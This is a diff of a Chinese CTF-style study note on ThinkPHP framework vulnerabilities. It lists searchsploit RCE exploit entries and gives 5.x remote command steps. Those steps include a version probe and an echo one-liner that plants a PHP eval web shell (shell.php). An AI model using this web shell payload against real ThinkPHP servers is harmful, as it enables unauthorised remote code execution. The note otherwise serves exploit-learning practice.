@@ -2,23 +2,23 @@
 
 # 00X1 什么是thinkphp
 ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架
->**什么是web框架？**  
-[web框架](https://blog.csdn.net/weixin_42976659/article/details/88187868?ops_request_misc=&request_id=&biz_id=102&utm_term=web%25E6%25A1%2586%25E6%259E%25B6&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-6-88187868.nonecase)  
->**什么是静态与动态网站？**  
+>**什么是web框架？**
+[web框架](https://blog.csdn.net/weixin_42976659/article/details/88187868?ops_request_misc=&request_id=&biz_id=102&utm_term=web%25E6%25A1%2586%25E6%259E%25B6&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-6-88187868.nonecase)
+>**什么是静态与动态网站？**
 [静态与动态网站](https://blog.csdn.net/liangmengbk/article/details/99176845?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160889557916780296863195%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&request_id=160889557916780296863195&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-99176845.first_rank_v2_pc_rank_v29&utm_term=%E5%8A%A8%E6%80%81%E7%BD%91%E7%AB%99%E5%92%8C%E9%9D%99%E6%80%81%E7%BD%91%E7%AB%99%E5%8C%BA%E5%88%AB)
 
 # 00X2 thinkphp 漏洞利用
 ### 工具
->**在线漏洞查询网站**  
+>**在线漏洞查询网站**
 [exploit database](https://www.exploit-db.com)
 
->**kali**  
+>**kali**
 searchsploit
 
 ```
 ┌──(sinon㉿kali)-[~]
 └─$ searchsploit thinkphp
-   
+
 Exploit Title                          |  Path
 ---------------------------------------- ---------------------------------
 ThinkPHP - Multiple PHP Injection RCEs  | linux/remote/48333.rb
@@ -33,17 +33,23 @@ ThinkPHP 5.X - Remote Command Execution | php/webapps/46150.txt
 ┌──(sinon㉿kali)-[/usr/…/exploitdb/exploits/php/webapps]
 └─$ gedit ***.txt
 ```
-# 00X3 payload
+# 00X3 题型
+### 5.x 远程命令/SQL注入
+### 6.x 反序列化/文件操作漏洞
+# 00X4 5.x 远程命令 payload
 ### step1
->/?s=1  
+>/?s=1
 **查看thinkphp版本**
 ### step2
->echo '\<?php highlight_file(\_\_FILE__);@eval($_POST["shell"]);?>'>shell.php  
-**上🐎,验证成功上🐎**  
+>echo '\<?php highlight_file(\_\_FILE__);@eval($_POST["shell"]);?>'>shell.php
+**上🐎,验证成功上🐎**
 
->echo '\<?php highlight_file(\_\_FILE__);@eval(phpinfo());?>'>info.php  
+>echo '\<?php highlight_file(\_\_FILE__);@eval(phpinfo());?>'>info.php
 **查看info页面**
 
->ls /  
-cat /flag  
+>ls /
+cat /flag
 **常规命令**
+# 00X5 5.x SQL注入 payload
+[Reference](https://blog.csdn.net/Fly_hps/article/details/84956102?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522160888490716780304694615%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&request_id=160888490716780304694615&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-84956102.first_rank_v2_pc_rank_v29&utm_term=thinkphp%E6%BC%8F%E6%B4%9E)
+# 00X6 6.x 文件操作漏洞
